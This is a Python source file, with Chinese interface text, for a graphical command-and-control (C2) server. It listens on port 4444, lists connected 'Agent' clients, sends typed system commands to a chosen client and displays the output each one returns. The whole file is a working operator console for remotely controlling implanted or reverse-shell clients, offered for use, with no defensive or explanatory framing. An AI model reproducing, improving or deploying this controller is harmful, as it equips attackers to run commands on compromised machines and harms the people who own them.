import socket
import threading
import tkinter as tk
from tkinter import messagebox, scrolledtext

class C2GuiMaster:
    def __init__(self, root):
        self.root = root
        self.root.title("C2 现代化可视化控制台")
        self.root.geometry("800x550")
        
        self.server_socket = None
        self.is_running = False
        self.clients = {}  # 存储客户端连接 {addr: conn}

        # --- 顶部配置面板 ---
        top_frame = tk.LabelFrame(root, text=" 服务监听配置 ", padx=10, pady=10)
        top_frame.pack(fill="x", padx=10, pady=10)

        tk.Label(top_frame, text="监听端口:").grid(row=0, column=0, sticky="w")
        self.port_entry = tk.Entry(top_frame, width=10)
        self.port_entry.insert(0, "4444")
        self.port_entry.grid(row=0, column=1, padx=5)

        self.start_btn = tk.Button(top_frame, text="启动监听服务", bg="green", fg="white", command=self.toggle_server)
        self.start_btn.grid(row=0, column=2, padx=10)

        # --- 中部：左侧在线列表 / 右侧日志输出 ---
        middle_frame = tk.Frame(root)
        middle_frame.pack(fill="both", expand=True, padx=10, pady=5)

        # 左侧：在线客户端列表
        left_sub = tk.LabelFrame(middle_frame, text=" 已上线客户端 (Agent) ")
        left_sub.pack(side="left", fill="y", padx=5)

        self.client_listbox = tk.Listbox(left_sub, width=25, height=20)
        self.client_listbox.pack(fill="both", expand=True, padx=5, pady=5)
        self.client_listbox.bind("<<ListboxSelect>>", self.on_select_client)

        # 右侧：实时日志与交互控制台
        right_sub = tk.LabelFrame(middle_frame, text=" 运行日志与回显 ")
        right_sub.pack(side="right", fill="both", expand=True, padx=5)

        self.log_text = scrolledtext.ScrolledText(right_sub, wrap="word", bg="black", fg="lime", font=("Consolas", 10))
        self.log_text.pack(fill="both", expand=True, padx=5, pady=5)

        # --- 底部：下发指令面板 ---
        bottom_frame = tk.LabelFrame(root, text=" 下发系统控制指令 ", padx=10, pady=10)
        bottom_frame.pack(fill="x", padx=10, pady=10)

        tk.Label(bottom_frame, text="输入指令:").grid(row=0, column=0, sticky="w")
        self.cmd_entry = tk.Entry(bottom_frame, width=50)
        self.cmd_entry.grid(row=0, column=1, padx=5)
        self.cmd_entry.bind("<Return>", lambda event: self.send_command())

        self.send_btn = tk.Button(bottom_frame, text="发送指令", bg="blue", fg="white", command=self.send_command)
        self.send_btn.grid(row=0, column=2, padx=10)

        self.current_selected_client = None

    def log(self, message):
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)

    def toggle_server(self):
        if not self.is_running:
            try:
                port = int(self.port_entry.get())
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.bind(("0.0.0.0", port))
                self.server_socket.listen(5)
                self.is_running = True
                
                self.start_btn.config(text="停止监听", bg="red")
                self.port_entry.config(state="disabled")
                self.log(f"[*] 监听服务已成功启动，端口: {port}")

                # 开启线程监听客户端接入
                threading.Thread(target=self.accept_clients, daemon=True).start()
            except Exception as e:
                messagebox.showerror("错误", f"启动失败: {str(e)}")
        else:
            self.is_running = False
            if self.server_socket:
                self.server_socket.close()
            self.start_btn.config(text="启动监听服务", bg="green")
            self.port_entry.config(state="normal")
            self.log("[-] 监听服务已关闭。")

    def accept_clients(self):
        while self.is_running:
            try:
                conn, addr = self.server_socket.accept()
                addr_str = f"{addr[0]}:{addr[1]}"
                self.clients[addr_str] = conn
                self.root.after(0, lambda: self.client_listbox.insert(tk.END, addr_str))
                self.log(f"[+] 新客户端上线: {addr_str}")

                # 开启独立线程接收该客户端的回传数据
                threading.Thread(target=self.handle_client, args=(conn, addr_str), daemon=True).start()
            except:
                break

    def handle_client(self, conn, addr_str):
        while self.is_running:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                output = data.decode('utf-8', errors='ignore')
                self.root.after(0, lambda: self.log(f"[{addr_str} 回显]:\n{output}"))
            except:
                break
        # 断开后清理
        if addr_str in self.clients:
            del self.clients[addr_str]
        self.root.after(0, lambda: self.remove_client_ui(addr_str))

    def remove_client_ui(self, addr_str):
        items = self.client_listbox.get(0, tk.END)
        if addr_str in items:
            idx = items.index(addr_str)
            self.client_listbox.delete(idx)
        self.log(f"[-] 客户端断开连接: {addr_str}")

    def on_select_client(self, event):
        selection = self.client_listbox.curselection()
        if selection:
            self.current_selected_client = self.client_listbox.get(selection[0])

    def send_command(self):
        if not self.current_selected_client:
            messagebox.showwarning("提示", "请先在左侧列表中点击选中一个上线的客户端！")
            return
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        
        conn = self.clients.get(self.current_selected_client)
        if conn:
            try:
                conn.sendall(cmd.encode('utf-8'))
                self.log(f"[-> 已下发至 {self.current_selected_client}]: {cmd}")
                self.cmd_entry.delete(0, tk.END)
            except Exception as e:
                messagebox.showerror("错误", f"发送指令失败: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = C2GuiMaster(root)
    root.mainloop()